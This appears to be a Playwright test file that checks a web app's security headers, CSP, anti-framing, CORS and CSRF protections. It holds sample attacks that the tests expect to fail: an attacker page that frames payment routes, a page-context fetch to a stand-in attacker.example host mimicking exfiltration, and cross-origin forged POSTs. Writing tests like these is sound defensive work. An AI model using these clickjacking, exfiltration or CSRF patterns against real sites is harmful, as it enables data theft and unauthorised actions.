/**
 * W3 (CSRF / CORS) and W4 (clickjacking, security headers) — wave3-web-ops.md. Every assertion states the property
 * that must hold; a red test here is a finding (RT-W-*), never a flaky one.
 */
import { expect, test } from '@playwright/test';

import { API_URL } from '../../e2e/env';

const EVIL = 'http://127.0.0.1:9999';

/** Every route incl. error states (unknown plan, invalid card, unknown sponsor) and the PWA plumbing. */
const ROUTES = [
  '/',
  '/verify',
  '/plan',
  '/plan/not-a-key',
  '/install',
  '/install?lpa=LPA:1$local.test$EVIL',
  '/pay',
  '/pay?key=not-a-key',
  '/agent',
  '/gift',
  '/gift/claim',
  '/receipts',
  '/sponsor',
  '/sponsor/0x00',
  '/card',
  '/card/zzzzzzzz',
  '/offline',
  '/print/cards',
  '/manifest.webmanifest',
  '/sw.js',
  '/this-route-does-not-exist',
];

test.describe('W4 security headers on every route', () => {
  for (const route of ROUTES) {
    // Property: every response (incl. 404s and the print 404) carries the frame/CSP/referrer/nosniff set.
    test(`headers: ${route}`, async ({ request }) => {
      const res = await request.get(route, { maxRedirects: 0 });
      const h = res.headers();
      const csp = h['content-security-policy'] ?? '';
      expect(csp, `${route} CSP`).toContain("frame-ancestors 'none'");
      expect(csp).toContain("base-uri 'none'");
      expect(csp).toContain("object-src 'none'");
      expect(csp).not.toContain("'unsafe-eval'");
      expect(h['x-frame-options']).toBe('DENY');
      expect(h['referrer-policy']).toBe('no-referrer');
      expect(h['x-content-type-options']).toBe('nosniff');
      expect(h['permissions-policy']).toContain('camera=()');
      // connect-src: explicit hosts only — no `*`, no scheme-wide `https:`/`http:`/`data:` source
      const connect = /connect-src ([^;]+)/.exec(csp)?.[1]?.split(/\s+/) ?? [];
      expect(connect.length).toBeGreaterThan(0);
      for (const src of connect)
        expect(src, `connect-src ${src}`).not.toMatch(/^(\*|https?:|data:|blob:)$/);
    });
  }

  // Property: the PWA cannot be framed — /pay, /agent, /sponsor/x stay empty inside an attacker iframe.
  test('frames: /pay, /agent, /sponsor/x do not render inside an attacker page', async ({
    page,
    baseURL,
  }) => {
    await page.route(`${EVIL}/evil.html`, (route) =>
      route.fulfill({
        contentType: 'text/html',
        body: ['/pay', '/agent', '/sponsor/0x00']
          .map((p) => `<iframe src="${baseURL}${p}"></iframe>`)
          .join(''),
      }),
    );
    await page.goto(`${EVIL}/evil.html`);
    await page.waitForTimeout(1500);
    for (const frame of page.frames().slice(1)) {
      const text = await frame.evaluate(() => document.body?.innerText ?? '').catch(() => '');
      expect(text.trim(), `framed ${frame.url()} rendered content`).toBe('');
    }
  });

  // Property: CSP connect-src blocks exfiltration to an arbitrary host from the page context.
  test('CSP: fetch to attacker.example from the page is blocked', async ({ page }) => {
    await page.goto('/offline');
    const outcome = await page.evaluate(async () => {
      try {
        // eslint-disable-next-line no-restricted-syntax -- the attack IS a raw browser fetch (runs in the page)
        await fetch('https://attacker.example/x');
        return 'sent';
      } catch {
        return 'blocked';
      }
    });
    expect(outcome).toBe('blocked');
  });
});

test.describe('W3 CSRF and CORS against the API the PWA talks to', () => {
  // Property: no reflected or wildcard CORS for an attacker origin; no credentials mode.
  test('preflight from an attacker origin gets no Access-Control-Allow-Origin', async ({
    request,
  }) => {
    for (const path of ['/claim', '/card/redeem', '/gift/claim', '/agent/policy', '/sponsor']) {
      const res = await request.fetch(`${API_URL}${path}`, {
        method: 'OPTIONS',
        headers: {
          origin: EVIL,
          'access-control-request-method': 'POST',
          'access-control-request-headers': 'content-type',
        },
      });
      const h = res.headers();
      expect(h['access-control-allow-origin'] ?? '', path).not.toBe('*');
      expect(h['access-control-allow-origin'] ?? '', path).not.toBe(EVIL);
      expect(h['access-control-allow-credentials'] ?? '', path).not.toBe('true');
    }
  });

  // Property: a "simple" text/plain cross-site POST (form / no-cors fetch) is refused before any state change.
  test('text/plain simple POSTs to state-changing routes are refused', async ({ request }) => {
    for (const path of ['/claim', '/card/redeem', '/gift/claim', '/gift/reclaim', '/challenge']) {
      const res = await request.post(`${API_URL}${path}`, {
        headers: { 'content-type': 'text/plain', origin: EVIL, 'x-forwarded-for': '198.51.100.7' },
        data: JSON.stringify({
          pin: '4821993011275064',
          audience: 'recharge',
          path: '/card/redeem',
        }),
      });
      expect([400, 415], `${path} → ${res.status()}`).toContain(res.status());
    }
  });

  // Property: neither the web app nor the API sets a cookie a cross-site request could ride.
  test('no cookies are set by the web app', async ({ page, context }) => {
    for (const route of ['/', '/verify', '/gift', '/sponsor', '/card']) await page.goto(route);
    expect(await context.cookies()).toEqual([]);
  });
});
